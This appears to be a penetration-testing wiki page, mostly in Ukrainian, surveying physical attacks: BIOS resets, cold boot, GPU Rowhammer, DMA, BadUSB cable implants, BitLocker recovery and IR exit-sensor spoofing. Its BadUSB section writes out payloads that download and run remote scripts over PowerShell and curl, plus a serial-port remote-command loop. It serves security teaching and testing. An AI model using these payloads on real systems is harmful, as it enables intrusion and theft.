# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## Відновлення пароля BIOS і безпека системи

**Скидання BIOS** можна виконати кількома способами. Більшість материнських плат мають **батарейку**, яка, якщо її вийняти приблизно на **30 хвилин**, скине налаштування BIOS, включно з паролем. Або ж можна змінити **джампер на материнській платі**, щоб скинути ці налаштування, з’єднавши певні контакти.

У ситуаціях, коли апаратні зміни неможливі або недоцільні, допомагають **software tools**. Запуск системи з **Live CD/USB** із дистрибутивами на кшталт **Kali Linux** надає доступ до інструментів **_killCmos_** та **_CmosPWD_**, які можуть допомогти у відновленні пароля BIOS.

Якщо пароль BIOS невідомий, тричі неправильне введення зазвичай призводить до появи коду помилки. Цей код можна використати на сайтах на кшталт [https://bios-pw.org](https://bios-pw.org), щоб потенційно отримати придатний пароль.

### UEFI Security

Для сучасних систем, що використовують **UEFI** замість традиційного BIOS, можна застосувати інструмент **chipsec** для аналізу та зміни налаштувань UEFI, зокрема для вимкнення **Secure Boot**. Це можна зробити за допомогою такої команди:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM зберігає дані короткий час після відключення живлення, зазвичай **1 to 2 minutes**. Це збереження можна подовжити до **10 minutes** шляхом застосування холодних речовин, таких як рідкий азот. Упродовж цього розширеного періоду можна створити **memory dump** за допомогою інструментів на кшталт **dd.exe** і **volatility** для аналізу.

---

## GPU Rowhammer Against Page Tables

Сучасні GPU Rowhammer-атаки стають значно кориснішими, коли вони націлені на **GPU virtual-memory metadata** замість звичайних буферів. Недавня робота на **GDDR6 NVIDIA Ampere GPUs** показує, що атакувальник, який запускає непривілейований CUDA code, може будувати GPU-specific hammering patterns, використовувати **memory massaging** для розміщення paging structures у вразливих рядах, а потім змінювати біти в **last-level page table** або проміжному **page directory**. Щойно одна translation entry пошкоджена, атакувальник може bootstrap’ити **arbitrary GPU memory read/write**, а потім pivot into host compromise.

### Exploitation Pattern

1. **Profile hammerable rows** у GDDR6 і будуйте refresh-aware / non-uniform hammering patterns, які обходять in-DRAM mitigations.
2. **Massage GPU allocations** так, щоб драйвер розміщував page-translation structures у вразливих фізичних локаціях замість зберігання їх у типовому захищеному пулі. На практиці це може означати виснаження low-memory page-table region і spraying великих sparse UVM mappings з контрольованими strides.
3. **Flip translation metadata** такого типу, як **PFN** або aperture-related bits усередині page-table / page-directory entry, щоб керована атакувальником virtual page розв’язувалася в page-table pages, arbitrary GPU memory або host-visible system mappings.
4. Повторно використайте підроблене mapping, щоб перезаписати додаткові translation entries і ескалувати до **arbitrary GPU memory read/write** across GPU contexts.

### Host Pivot and Mitigations

- З **IOMMU disabled**, підроблені system-aperture mappings можуть розкрити довільну **host physical memory** для GPU, перетворюючи GPU primitive на повне host compromise.
- **GDDRHammer** націлений на last-level page-table entries, тоді як **GeForge** показує, що пошкодження page-directory level може бути простішим, тому що один bit flip може перенаправити більший translation subtree. Не вважайте лише один paging layer критичним для безпеки.
- **IOMMU** все ще важливий, бо він блокує прямий arbitrary-host-memory шлях, який використовують GDDRHammer/GeForge, але він **not a complete mitigation**. **GPUBreach** показує second-stage pivot, де атакувальник пошкоджує GPU-writable, driver-owned CPU buffers, а потім запускає NVIDIA driver memory-safety bugs, щоб отримати kernel write primitive і **root shell** навіть із увімкненим IOMMU.
- **System-level ECC** є практичним hardening-кроком на підтримуваних workstation/server GPUs. Consumer GPUs без ECC відкривають слабшу defense surface.
- Ці атаки не є суто теоретичними: **GeForge** повідомив про **1,171** bit flips на RTX 3060 і **202** на RTX A6000, чого було достатньо для побудови working host-privilege-escalation chain.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** — це tool, призначений для **physical memory manipulation** через DMA, сумісний з такими interfaces, як **FireWire** і **Thunderbolt**. Він дозволяє bypass login procedures шляхом patching memory, щоб приймати будь-який password. Однак він неефективний проти систем **Windows 10**.

---

## Live CD/USB for System Access

Заміна system binaries, таких як **_sethc.exe_** або **_Utilman.exe_**, копією **_cmd.exe_** може надати command prompt із system privileges. Tools на кшталт **chntpw** можна використовувати для редагування файлу **SAM** інсталяції Windows, що дозволяє змінювати passwords.

**Kon-Boot** — це tool, який полегшує вхід у Windows systems без знання password шляхом тимчасової модифікації Windows kernel або UEFI. Більше інформації можна знайти на [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Доступ до BIOS settings.
- **F8**: Вхід у Recovery mode.
- Натискання **Shift** після Windows banner може bypass autologon.

### BAD USB Devices

Devices на кшталт **Rubber Ducky** і **Teensyduino** слугують платформами для створення **bad USB** devices, здатних виконувати заздалегідь визначені payloads після підключення до target computer.

### Volume Shadow Copy

Administrator privileges дозволяють створювати copies sensitive files, включно з файлом **SAM**, через PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Імпланти на базі ESP32-S3, такі як **Evil Crow Cable Wind**, ховаються всередині USB-A→USB-C або USB-C↔USB-C cables, перераховуються виключно як USB keyboard і expose their C2 stack over Wi-Fi. Оператору потрібно лише подати живлення на cable від host-жертви, створити hotspot із назвою `Evil Crow Cable Wind` та password `123456789`, і відкрити [http://cable-wind.local/](http://cable-wind.local/) (або його DHCP address), щоб отримати доступ до вбудованого HTTP interface.
- Browser UI надає tabs для *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* і *Config*. Збережені payloads позначаються per OS, keyboard layouts перемикаються on the fly, а VID/PID strings можна змінювати, щоб імітувати відомі peripherals.
- Оскільки C2 працює всередині cable, phone може stage payloads, запускати execution і керувати Wi-Fi credentials без доторку до host OS — ідеально для коротких physical intrusions.

### OS-aware AutoExec payloads

- Правила AutoExec прив’язують один або кілька payloads до негайного запуску після USB enumeration. Імплант виконує легке OS fingerprinting і вибирає відповідний script.
- Приклад workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) або `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Оскільки execution відбувається unattended, проста заміна charging cable може забезпечити “plug-and-pwn” initial access у контексті logged-on user.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Збережений payload відкриває console і вставляє loop, який виконує все, що надходить на новий USB serial device. Мінімальний Windows-варіант такий:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Імплант тримає USB CDC-канал відкритим, поки його ESP32-S3 запускає TCP client (Python script, Android APK або desktop executable) назад до оператора. Будь-які байти, введені в TCP session, пересилаються в serial loop вище, що дає remote command execution навіть на air-gapped hosts. Вивід обмежений, тому operators зазвичай запускають blind commands (створення облікового запису, staging додаткових tooling тощо).

### HTTP OTA update surface

- Та ж web stack зазвичай відкриває unauthenticated firmware updates. Evil Crow Cable Wind слухає на `/update` і прошиває будь-який binary, який завантажено:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Обхід BitLocker Encryption

BitLocker encryption can potentially be bypassed if the **recovery password** is found within a memory dump file (**MEMORY.DMP**). Tools like **Elcomsoft Forensic Disk Decryptor** or **Passware Kit Forensic** can be utilized for this purpose.

---

## Social Engineering для додавання Recovery Key

Новий BitLocker recovery key можна додати за допомогою social engineering tactics, переконавши користувача виконати команду, яка додає новий recovery key, складений із нулів, тим самим спрощуючи процес дешифрування.

---

## Експлуатація Chassis Intrusion / Maintenance Switches для Factory-Reset BIOS

Багато сучасних ноутбуків і small-form-factor desktops мають **chassis-intrusion switch**, який відстежується Embedded Controller (EC) та BIOS/UEFI firmware. Хоча основне призначення цього перемикача — сповіщати про відкриття пристрою, постачальники іноді реалізують **undocumented recovery shortcut**, який активується, коли перемикач переводять у певній послідовності.

### Як працює атака

1. Перемикач під’єднаний до **GPIO interrupt** на EC.
2. Firmware, що працює на EC, відстежує **timing and number of presses**.
3. Коли розпізнається жорстко заданий шаблон, EC запускає процедуру *mainboard-reset*, яка **erases the contents of the system NVRAM/CMOS**.
4. Під час наступного завантаження BIOS завантажує значення за замовчуванням – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.

> Once Secure Boot is disabled and the firmware password is gone, the attacker can simply boot any external OS image and obtain unrestricted access to the internal drives.

### Реальний приклад – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Після десятого циклу EC встановлює прапорець, який наказує BIOS очистити NVRAM під час наступного перезавантаження. Уся процедура займає ~40 с і потребує **нічого, крім викрутки**.

### Generic Exploitation Procedure

1. Увімкніть ціль або виконайте suspend-resume, щоб EC працював.
2. Зніміть нижню кришку, щоб відкрити перемикач проникнення/обслуговування.
3. Відтворіть vendor-specific шаблон перемикань (див. документацію, форуми або reverse-engineer firmware EC).
4. Зберіть пристрій назад і перезавантажте його — захист firmware має бути вимкнений.
5. Завантажте live USB (наприклад, Kali Linux) і виконайте звичний post-exploitation (credential dumping, data exfiltration, впровадження шкідливих EFI binaries тощо).

### Detection & Mitigation

* Логуйте події chassis-intrusion в OS management console і корелюйте їх із неочікуваними BIOS reset.
* Використовуйте **tamper-evident seals** на гвинтах/кришках, щоб виявляти відкривання.
* Тримайте пристрої у **physically controlled areas**; вважайте, що фізичний доступ дорівнює повному компромету.
* Якщо доступно, вимкніть vendor “maintenance switch reset” feature або вимагайте додаткову cryptographic authorisation для NVRAM reset.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.

### Long-Range Reflective Injection
- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.

### Weaponised Attack Torch
- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
